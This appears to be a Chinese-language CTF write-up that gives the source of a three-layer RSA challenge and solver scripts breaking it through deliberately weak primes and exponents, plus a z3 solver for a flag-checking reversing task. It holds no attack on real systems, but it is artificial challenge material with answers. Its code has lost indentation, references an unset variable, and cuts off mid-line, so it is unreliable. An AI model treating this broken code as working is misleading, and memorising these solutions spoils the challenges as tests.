class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag </span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> next_prime,invert,gcd</span><br><span class="line"><span class="keyword">import</span> os                              </span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"><span class="comment">## level1</span></span><br><span class="line">x = getPrime(<span class="number">290</span>)</span><br><span class="line">y = next_prime(<span class="number">21</span>*x)</span><br><span class="line">z = next_prime(<span class="number">3</span>*x*y)</span><br><span class="line">n1 = x*y*z</span><br><span class="line">msg = flag+os.urandom(<span class="number">100</span>)</span><br><span class="line">m = bytes_to_long(msg)</span><br><span class="line"><span class="keyword">assert</span>(m &lt; n1)</span><br><span class="line"><span class="keyword">print</span> n1</span><br><span class="line">c1 = pow(m,e,n1)</span><br><span class="line"></span><br><span class="line"><span class="comment">## level2</span></span><br><span class="line">m = c1</span><br><span class="line">o = getPrime(<span class="number">300</span>) </span><br><span class="line">s = getPrime(<span class="number">300</span>)</span><br><span class="line">t = next_prime(o)</span><br><span class="line">u = next_prime(s)</span><br><span class="line"><span class="keyword">print</span> o*s</span><br><span class="line">n2 = o*s*t*u</span><br><span class="line"><span class="keyword">assert</span>(m&lt;n2)</span><br><span class="line"><span class="keyword">print</span> n2</span><br><span class="line">c2 = pow(m,e,n2)</span><br><span class="line"><span class="comment">## level3</span></span><br><span class="line">m = c2</span><br><span class="line">p = getPrime(<span class="number">800</span>)</span><br><span class="line">q = getPrime(<span class="number">800</span>)</span><br><span class="line"></span><br><span class="line">n3 = p * q</span><br><span class="line">phi = (q<span class="number">-1</span>)*(p<span class="number">-1</span>)</span><br><span class="line"><span class="keyword">assert</span>(m &lt; n3)</span><br><span class="line"><span class="keyword">print</span> n3</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    s = getPrime(<span class="number">10</span>)</span><br><span class="line">    <span class="keyword">if</span>(gcd(s,p<span class="number">-1</span>) == <span class="number">1</span>):</span><br><span class="line">        sinv = invert(s,p<span class="number">-1</span>)</span><br><span class="line">        e = <span class="number">4</span>*s*sinv+<span class="number">3</span></span><br><span class="line">        <span class="keyword">if</span>(gcd(phi,e) == <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">c3 = pow(m,e,n3)</span><br><span class="line"><span class="keyword">print</span> c3</span><br><span class="line">m = bytes_to_long(os.urandom(<span class="number">128</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> m</span><br><span class="line"><span class="keyword">assert</span>(m&lt;n3)</span><br><span class="line"><span class="keyword">print</span> pow(m,e,n3)</span><br></pre></td></tr></table></figure><p>从后往前，第三层</p><p>e=4*s*sinv+3=4<em>(1+k\</em>(p-1))+3=4*k*(p-1)+7</p><p>pow(m,e,p)=pow(m,7,p)</p><p>pow(m,e,n)-pow(m,7,n)=x*p % n</p><p>n=p*q</p><p>gcd(n,pow(m,e,n)-pow(m,7,n))=p</p><p>然后可以爆破s得到e</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os                              </span><br><span class="line"></span><br><span class="line">c4=<span class="number">22238585749689335043198360403653248049710943304594623939441271714322821476047298977043454290592085809700500599520080107736858423927071836758485527270617538166045213386679961664240306883126224169183649140929168343634245637578487850945986688768857954082116136864696582066988005306045105860368497626822666433678879698344619056273526837700698315346972423482713305543394110949178233504551465821354514535155389087138867576532139739270960823294873497825040963862751772914087741831403951901</span></span><br><span class="line">n3=<span class="number">24502730939655407292543436897382196297516664227273320602397906878696723372242877776550446563950867624819352853122033114711732125433588724779869985477495098802744344448915032607469954642257825855931872281908232331623829725043031800535739432133948607448362641204034546581444904408754892037110031202573463399201625812005615264689877537231974023870006792196961829162058446662172634212427186470724599941352830546043772969297733239518604749366684163813795999625784931375110137805143337329</span></span><br><span class="line">m4_old=<span class="number">81225738828166640599054154023183465870678960906769673605358084529196871174429427936591822589995476552044227730868809310992934103731850597399114246762836121101348301079296663951503688072299542357013093324718850936925265954204973634470836187733828189312553819810470405246669124171178070485118436102895117354417</span></span><br><span class="line"></span><br><span class="line">p3=gcd(n3,c4-pow(m4_old,<span class="number">7</span>,n3))</span><br><span class="line"><span class="keyword">print</span> p3</span><br><span class="line">q3=n3/p3</span><br><span class="line">phi3=(p3<span class="number">-1</span>)*(q3<span class="number">-1</span>)</span><br><span class="line">c3=<span class="number">2385064917660948806957457681641614888669217960607006360543268900921017481245498563263991410918604891314384810533439253814523067168636768976220059028108900592323119524657903364697700329145453517769093265052715204625870232288203427545150983037310876534801548309890853026234248412421497939811385725642492104262954059677793538707604205179344884142656842895567795000647837461835179395742399372683460208271310884657279893532539121893558143029933794905470899127632780110459122203796256514</span></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> range(<span class="number">2</span>**<span class="number">10</span>,<span class="number">2</span>**<span class="number">11</span>):</span><br><span class="line">    <span class="comment">#s = getPrime(10)</span></span><br><span class="line">    <span class="keyword">if</span>(gcd(s,p3<span class="number">-1</span>) == <span class="number">1</span>):</span><br><span class="line">        sinv = invert(s,p3<span class="number">-1</span>)</span><br><span class="line">        e = <span class="number">4</span>*s*sinv+<span class="number">3</span></span><br><span class="line">        <span class="keyword">if</span>(gcd(phi3,e) == <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span>(powmod(m4_old,e,n3)==c4):</span><br><span class="line"><span class="keyword">print</span> <span class="string">'e3 is '</span>,e</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> s%<span class="number">10000</span>==<span class="number">0</span>:</span><br><span class="line"> <span class="keyword">print</span> s</span><br><span class="line">d3=invert(e3,phi3)</span><br><span class="line">m3=powmod(c3,d3,n3)</span><br><span class="line">c2=m3</span><br></pre></td></tr></table></figure><p>第二层t和o接近，u和s接近，所以我们设x=t-o,y=u-s</p><p>然后对x，y进行一个爆破。</p><p>已知o*s=a，(o+x)*(s+y)=b</p><p>我们想求o,x,s,y四个值</p><p>有（xy-((o+x)*(s+y)-o*s))^2=(xy-xs-xy-oy)^2=xs^2+oy^2+2xsoy</p><p>所以我们可以有(xs-oy)^2=xy-((o+x)*(s+y)-o*s))^2-4osxy</p><p>开根得到xs-oy或者oy-xs，那么我们用(o+x)*(s+y)-(os+xy+xs-oy)=2oy，2oy/y得到o值，得到四个o,x,s,y值</p><p>第一层</p><p>其实可以用<a href="https://www.alpertron.com.ar/ECM.HTM强行分解" target="_blank" rel="noopener">https://www.alpertron.com.ar/ECM.HTM强行分解</a></p><p>x = getPrime(290)<br>y = next_prime(21<em>x)<br>z = next_prime(3</em>x*y)</p><p>n1=xyz约等于x(21x)(3x21x)=3*21*21*x^4</p><p>所以其实n1/(3*21*21)然后开四次方可以得到x的近似值，然后在那附近爆破x就行了。</p><h3 id="第三场"><a href="#第三场" class="headerlink" title="第三场"></a>第三场</h3><p>因为忘记&amp;0xff了，所以以为求解工具有问题，撸了z3，sage，numpy三个板子。线性方程最好z3还是用Int，约束里不要做异或。粗心害死人啊</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line">flag=[Int(<span class="string">'flag[%d]'</span>%i)<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">42</span>)]</span><br><span class="line">s=Solver()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_models</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> s.check() == sat:</span><br><span class="line">        m = s.model()</span><br><span class="line">        <span class="keyword">yield</span> m</span><br><span class="line">        s.add(Or([sym() != m[sym] <span class="keyword">for</span> sym <span class="keyword">in</span> m.decls()]))</span><br><span class="line">xor_table=[<span class="number">0xA0</span></span><br><span class="line">,<span class="number">0xE4</span></span><br><span class="line">,<span class="number">0xBA</span></span><br><span class="line">,<span class="number">0xFB</span></span><br><span class="line">,<span class="number">0x10</span></span><br><span class="line">,<span class="number">0xDD</span></span><br><span class="line">,<span class="number">0xAC</span></span><br><span class="line">,<span class="number">0x65</span></span><br><span class="line">,<span class="number">0x8D</span></span><br><span class="line">,<span class="number">0xB</span></span><br><span class="line">,<span class="number">0x57</span></span><br><span class="line">,<span class="number">0x1A</span></span><br><span class="line">,<span class="number">0xE4</span></span><br><span class="line">,<span class="number">0x28</span></span><br><span class="line">,<span class="number">0x96</span></span><br><span class="line">,<span class="number">0xB3</span></span><br><span class="line">,<span class="number">0xC</span></span><br><span class="line">,<span class="number">0x79</span></span><br><span class="line">,<span class="number">0x4D</span></span><br><span class="line">,<span class="number">0x80</span></span><br><span class="line">,<span class="number">0x90</span></span><br><span class="line">,<span class="number">0x99</span></span><br><span class="line">,<span class="number">0x58</span></span><br><span class="line">,<span class="number">0xFE</span></span><br><span class="line">,<span class="number">0x50</span></span><br><span class="line">,<span class="number">0xD3</span></span><br><span class="line">,<span class="number">0xF9</span></span><br><span class="line">,<span class="number">0x3C</span></span><br><span class="line">,<span class="number">0xF</span></span><br><span class="line">,<span class="number">0xC1</span></span><br><span class="line">,<span class="number">0xE3</span></span><br><span class="line">,<span class="number">0xA6</span></span><br><span class="line">,<span class="number">0x39</span></span><br><span class="line">,<span class="number">0xC3</span></span><br><span class="line">,<span class="number">0x28</span></span><br><span class="line">,<span class="number">0x75</span></span><br><span class="line">,<span class="number">0xF8</span></span><br><span class="line">,<span class="number">0xC9</span></span><br><span class="line">,<span class="number">0xC8</span></span><br><span class="line">,<span class="number">0xCD</span></span><br><span class="line">,<span class="number">0x78</span></span><br><span class="line">,<span class="number">0x26</span>]</span><br><span class="line">data=[]</span><br><span class="line">tmp=int(argv[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">print</span> <span class="string">'key is '</span>,tmp</span><br><span class="line">data.append(tmp)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x1e</span>):</span><br><span class="line">res=<span class="number">16807</span> * (tmp % <span class="number">127773</span>) - <span class="number">2836</span> * (tmp // <span class="number">127773</span>)</span><br><span class="line"><span class="comment">#print hex(abs(res))</span></span><br><span class="line"><span class="keyword">if</span>(res&lt;<span class="number">0</span>):</span><br><span class="line">tmp=res+<span class="number">0x7FFFFFFF</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">tmp=res</span><br><span class="line">data.append(tmp)</span><br><span class="line"><span class="keyword">print</span> map(hex,data)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0x1f</span>):</span><br><span class="line"><span class="comment">#print "%x + %x =%x"%(data[(j+3)%0x1f],data[j],data[(j+3)%0x1f]+data[j])</span></span><br><span class="line">data[(j+<span class="number">3</span>)%<span class="number">0x1f</span>]=(data[(j+<span class="number">3</span>)%<span class="number">0x1f</span>]+data[j])&amp;<span class="number">0xffffffff</span></span><br><span class="line"><span class="string">'''for j in range(42+1):</span></span><br><span class="line"><span class="string">#print "%x + %x =%x"%(data[(j+3)%0x1f],data[j],data[(j+3)%0x1f]+data[j])</span></span><br><span class="line"><span class="string">data[(j+3)%0x1f]=(data[(j+3)%0x1f]+data[(j)%0x1f])&amp;0xffffffff</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">div2</span><span class="params">(num)</span>:</span></span><br><span class="line"><span class="keyword">return</span> num//<span class="number">2</span></span><br><span class="line"><span class="keyword">print</span> map(hex,map(div2,data))</span><br><span class="line"><span class="keyword">print</span> map(hex,data)</span><br><span class="line">table1=[]</span><br><span class="line">input=<span class="string">'flag&#123;111111111111111111111111111111111111&#125;'</span></span><br><span class="line">input_list=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">42</span>):</span><br><span class="line">input_list.append(ord(input[i])^xor_table[i])</span><br><span class="line">v6=[<span class="number">0</span>]*<span class="number">42</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">42</span>):</span><br><span class="line">table2=[]</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">42</span>):</span><br><span class="line"><span class="comment">#print "%x + %x =%x"%(data[(j+3)%0x1f],data[j],data[(j+3)%0x1f]+data[j])</span></span><br><span class="line">data[(i*<span class="number">42</span>+j+<span class="number">3</span>)%<span class="number">0x1f</span>]=(data[(i*<span class="number">42</span>+j+<span class="number">3</span>)%<span class="number">0x1f</span>]+data[(i*<span class="number">42</span>+j)%<span class="number">0x1f</span>])&amp;<span class="number">0xffffffff</span></span><br><span class="line">table2.append((((data[(i*<span class="number">42</span>+j+<span class="number">3</span>)%<span class="number">0x1f</span>]//<span class="number">2</span>)&amp;<span class="number">0xff</span>)+<span class="number">1</span>)&amp;<span class="number">0xff</span>)</span><br><span class="line">v6[i]+=table2[j]*input_list[j]</span><br><span class="line">table1.append(table2)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">42</span>):</span><br><span class="line"><span class="keyword">print</span> map(hex,table1[i])</span><br><span class="line">final=[<span class="number">0xbd360</span></span><br><span class="line">,<span class="number">0xb3ec5</span></span><br><span class="line">,<span class="number">0x8d98e</span></span><br><span class="line">,<span class="number">0xcb266</span></span><br><span class="line">,<span class="number">0xb497f</span></span><br><span class="line">,<span class="number">0xa861e</span></span><br><span class="line">,<span class="number">0x97acd</span></span><br><span class="line">,<span class="number">0xbfe57</span></span><br><span class="line">,<span class="number">0xa7d14</span></span><br><span class="line">,<span class="number">0xd4786</span></span><br><span class="line">,<span class="number">0xa3d60</span></span><br><span class="line">,<span class="number">0xac342</span></span><br><span class="line">,<span class="number">0xa9d96</span></span><br><span class="line">,<span class="number">0xb143b</span></span><br><span class="line">,<span class="number">0xa9633</span></span><br><span class="line">,<span class="number">0xb1463</span></span><br><span class="line">,<span class="number">0xc2acc</span></span><br><span class="line">,<span class="number">0xcd008</span></span><br><span class="line">,<span class="number">0xc2d4d</span></span><br><span class="line">,<span class="number">0xbcee2</span></span><br><span class="line">,<span class="number">0xb2cf6</span></span><br><span class="line">,<span class="number">0x9a886</span></span><br><span class="line">,<span class="number">0xb4e48</span></span><br><span class="line">,<span class="number">0xbd5e8</span></span><br><span class="line">,<span class="number">0xad646</span></span><br><span class="line">,<span class="number">0xd1a30</span></span><br><span class="line">,<span class="number">0xa7a1e</span></span><br><span class="line">,<span class="number">0x94a80</span></span><br><span class="line">,<span class="number">0xc6fdc</span></span><br><span class="line">,<span class="number">0x7f5f8</span></span><br><span class="line">,<span class="number">0xa93cd</span></span><br><span class="line">,<span class="number">0x88dc5</span></span><br><span class="line">,<span class="number">0xd816e</span></span><br><span class="line">,<span class="number">0x9b1aa</span></span><br><span class="line">,<span class="number">0xb2c7d</span></span><br><span class="line">,<span class="number">0xbc10e</span></span><br><span class="line">,<span class="number">0xab72d</span></span><br><span class="line">,<span class="number">0x9a7ba</span></span><br><span class="line">,<span class="number">0xcd12a</span></span><br><span class="line">,<span class="number">0xc6a1f</span></span><br><span class="line">,<span class="number">0x9f2d2</span></span><br><span class="line">,<span class="number">0xd5cbd</span></span><br><span class="line">]</span><br><span class="line"><span class="keyword">print</span> map(hex,v6)</span><br><span class="line"><span class="comment">#for i in range(42):</span></span><br><span class="line"><span class="comment">#print'(flag[%d]*table1[i][%d])+'%(i,i),</span></span><br><span class="line">s.add(flag[<span class="number">0</span>]==(ord(<span class="string">'f'</span>)^xor_table[<span class="number">0</span>]))</span><br><span class="line">s.add(flag[<span class="number">1</span>]==(ord(<span class="string">'l'</span>)^xor_table[<span class="number">1</span>]))</span><br><span class="line">s.add(flag[<span class="number">2</span>]==(ord(<span class="string">'a'</span>)^xor_table[<span class="number">2</span>]))</span><br><span class="line">s.add(flag[<span class="number">3</span>]==(ord(<span class="string">'g'</span>)^xor_table[<span class="number">3</span>]))</span><br><span class="line">s.add(flag[<span class="number">4</span>]==(ord(<span class="string">'&#123;'</span>)^xor_table[<span class="number">4</span>]))</span><br><span class="line">s.add(flag[<span class="number">41</span>]==(ord(<span class="string">'&#125;'</span>)^xor_table[<span class="number">41</span>]))</span><br><span class="line">tmp2=[<span class="number">0</span>]*<span class="number">42</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">42</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">42</span>):</span><br><span class="line">tmp2[i]+=flag[j]*table1[i][j]</span><br><span class="line">s.add(tmp2[i]==final[i])</span><br><span class="line"><span class="comment">#s.add((flag[0]*table1[i][0])+ (flag[1]*table1[i][1])+ (flag[2]*table1[i][2])+ (flag[3]*table1[i][3])+ (flag[4]*table1[i][4])+ (flag[5]*table1[i][5])+ (flag[6]*table1[i][6])+ (flag[7]*table1[i][7])+ (flag[8]*table1[i][8])+ (flag[9]*table1[i][9])+ (flag[10]*table1[i][10])+ (flag[11]*table1[i][11])+ (flag[12]*table1[i][12])+ (flag[13]*table1[i][13])+ (flag[14]*table1[i][14])+ (flag[15]*table1[i][15])+ (flag[16]*table1[i][16])+ (flag[17]*table1[i][17])+ (flag[18]*table1[i][18])+ (flag[19]*table1[i][19])+ (flag[20]*table1[i][20])+ (flag[21]*table1[i][21])+ (flag[22]*table1[i][22])+ (flag[23]*table1[i][23])+ (flag[24]*table1[i][24])+ (flag[25]*table1[i][25])+ (flag[26]*table1[i][26])+ (flag[27]*table1[i][27])+ (flag[28]*table1[i][28])+ (flag[29]*table1[i][29])+ (flag[30]*table1[i][30])+ (flag[31]*table1[i][31])+ (flag[32]*table1[i][32])+ (flag[33]*table1[i][33])+ (flag[34]*table1[i][34])+ (flag[35]*table1[i][35])+ (flag[36]*table1[i][36])+ (flag[37]*table1[i][37])+ (flag[38]*table1[i][38])+ (flag[39]*table1[i][39])+ (flag[40]*table1[i][40])+ (flag[41]*table1[i][41])==final[i])</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> get_models(s):</span><br><span class="line">    serial = [m[flag[i]].as_long() <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">42</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(serial)):</span><br><span class="line"><span class="keyword">print</span> chr(serial[i]^xor_table[i])</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line">xor_table=[<span class="number">0xA0</span></span><br><span class="line">,<span class="number">0xE4</span></span><br><span class="line">,<span class="number">0xBA</span></span><br><span class="line">,<span class="number">0xFB</span></span><br><span class="line">,<span class="number">0x10</span></span><br><span class="line">,<span class="number">0xDD</span></span><br><span class="line">,<span class="number">0xAC</span></span><br><span class="line">,<span class="number">0x65</span></span><br><span class="line">,<span class="number">0x8D</span></span><br><span class="line">,<span class="number">0xB</span></span><br><span class="line">,<span class="number">0x57</span></span><br><span class="line">,<span class="number">0x1A</span></span><br><span class="line">,<span class="number">0xE4</span></span><br><span class="line">,<span class="number">0x28</span></span><br><span class="line">,<span class="number">0x96</span></span><br><span class="line">,<span class="number">0xB3</span></span><br><span class="line">,<span class="number">0xC</span></span><br><span class="line">,<span class="number">0x79</span></span><br><span class="line">,<span class="number">0x4D</span></span><br><span class="line">,<span class="number">0x80</span></span><br><span class="line">,<span class="number">0x90</span></span><br><span class="line">,<span class="number">0x99</span></span><br><span class="line">,<span class="number">0x58</span></span><br><span class="line">,<span class="number">0xFE</span></span><br><span class="line">,<span class="number">0x50</span></span><br><span class="line">,<span class="number">0xD3</span></span><br><span class="line">,<span class="number">0xF9</span></span><br><span class="line">,<span class="number">0x3C</span></span><br><span class="line">,<span class="number">0xF</span></span><br><span class="line">,<span class="number">0xC1</span></span><br><span class="line">,<span class="number">0xE3</span></span><br><span class="line">,<span class="number">0xA6</span></span><br><span class="line">,<span class="number">0x39</span></span><br><span class="line">,<span class="number">0xC3</span></span><br><span class="line">,<span class="number">0x28</span></span><br><span class="line">,<span class="number">0x75</span></span><br><span class="line">,<span class="number">0xF8</span></span><br><span class="line">,<span class="number">0xC9</span></span><br><span class="line">,<span class="number">0xC8</span></span><br><span class="line">,<span class="number">0xCD</span></span><br><span class="line">,<span class="number">0x78</span></span><br><span class="line">,<span class="number">0x26</span>]</span><br><span class="line">data=[]</span><br><span class="line">tmp=<span class="number">82</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'key is '</span>,tmp</span><br><span class="line">data.append(tmp)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x1e</span>):</span><br><span class="line">res=<span class="number">16807</span> * (tmp % <span class="number">127773</span>) - <span class="number">2836</span> * (tmp // <span class="number">127773</span>)</span><br><span class="line"><span class="comment">#print hex(abs(res))</span></span><br><span class="line"><span class="keyword">if</span>(res&lt;<span class="number">0</span>):</span><br><span class="line">tmp=res+<span class="number">0x7FFFFFFF</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">tmp=res</span><br><span class="line">data.append(tmp)</span><br><span class="line"><span class="keyword">print</span> map(hex,data)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0x1f</span>):</span><br><span class="line"><span class="comment">#print "%x + %x =%x"%(data[(j+3)%0x1f],data[j],data[(j+3)%0x1f]+data[j])</span></span><br><span class="line">data[(j+<span class="number">3</span>)%<span 